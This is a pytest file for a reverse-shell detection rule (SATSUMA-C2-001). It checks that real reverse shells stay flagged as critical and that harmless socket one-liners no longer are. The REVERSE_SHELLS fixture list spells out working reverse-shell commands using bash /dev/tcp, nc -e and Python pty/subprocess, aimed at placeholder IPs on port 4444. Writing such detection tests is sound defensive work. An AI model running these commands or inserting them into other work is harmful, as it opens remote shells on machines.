"""SATSUMA-C2-001 stops reverse shells, not every Python one-liner that imports socket.

The rule used to match the text "python3 -c 'import socket", which classified a harmless
script such as python3 -c 'import socket; print(socket.gethostname())' as a critical,
likely reverse shell and stopped it. It now also needs a reverse-shell sign.

SATSUMA-C2-001 ters shell'leri durdurur, socket içe aktaran her Python tek satırını değil.
"""
import json
import time
from pathlib import Path

import pytest

from satsuma.ai_rule_package import digest
from satsuma.smart_rules import SmartRuleEngine

ROOT = Path(__file__).resolve().parents[1]
RULE = 'SATSUMA-C2-001'

REVERSE_SHELLS = [
    ('bash -i >& /dev/tcp/203.0.113.9/4444 0>&1', '/usr/bin/bash'),
    ('nc -e /bin/bash 203.0.113.9 4444', '/usr/bin/nc'),
    ("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"1.2.3.4\",4444));"
     "os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'", '/usr/bin/python3.13'),
    ("python3 -c 'import socket,subprocess;s=socket.create_connection((\"1.2.3.4\",4444));"
     "subprocess.call([\"/bin/sh\",\"-i\"])'", '/usr/bin/python3.13'),
    ("python3 -c 'import socket;s=socket.socket();s.connect((\"1.2.3.4\",9))'", '/usr/bin/python3.13'),
]
HARMLESS = [
    ("python3 -c 'import socket; print(socket.gethostname())'", '/usr/bin/python3.13'),
    ("python3 -c 'import socket; print(1)'", '/usr/bin/python3.13'),
    ("python3 -c 'import socket;s=socket.socket();s.bind((\"0.0.0.0\",8000));s.listen(1)'", '/usr/bin/python3.13'),
    ('python3 -m http.server 8000', '/usr/bin/python3.13'),
    ('rsync -avl /home/a /home/b', '/usr/bin/rsync'),
]


@pytest.fixture(scope='module')
def engine():
    engine = SmartRuleEngine(include_managed=False)
    assert engine.load_errors == []
    return engine


def matched(engine, cmd, exe):
    event = {'source': 'sys_proc', 'cmd': cmd, 'exe': exe, 'pid': 4242, 'timestamp': time.time(), 'id': 1}
    return [f for f in engine.match(event) if f['rule_id'] == RULE]


@pytest.mark.parametrize('cmd,exe', REVERSE_SHELLS)
def test_real_reverse_shells_are_still_classified_likely_critical(engine, cmd, exe):
    found = matched(engine, cmd, exe)
    assert len(found) == 1
    assert (found[0]['classification'], found[0]['severity']) == ('likely', 'critical')


@pytest.mark.parametrize('cmd,exe', HARMLESS)
def test_harmless_socket_one_liners_and_dev_tools_are_not_reverse_shells(engine, cmd, exe):
    assert matched(engine, cmd, exe) == []


def test_the_response_catalog_hash_matches_the_changed_rule(engine):
    rule = next(r for r in engine.rules if r['_id'] == RULE)
    content = {k: v for k, v in rule.items() if not k.startswith('_')}
    catalog = json.loads((ROOT / 'schemas/rule-response-catalog-v1.json').read_text())
    row = next(r for r in catalog['rules'] if r['rule_id'] == RULE)
    assert row['detection_sha256'] == digest(content) == rule['_content_hash']
    assert 'cmd_regex' in row['match']


def test_the_netcat_listener_rule_is_unchanged(engine):
    event = {'source': 'sys_proc', 'cmd': 'nc -l 9000', 'exe': '/usr/bin/ncat', 'pid': 1, 'timestamp': time.time(), 'id': 2}
    assert [f['rule_id'] for f in engine.match(event) if f['rule_id'] == 'SATSUMA-C2-002'] == ['SATSUMA-C2-002']
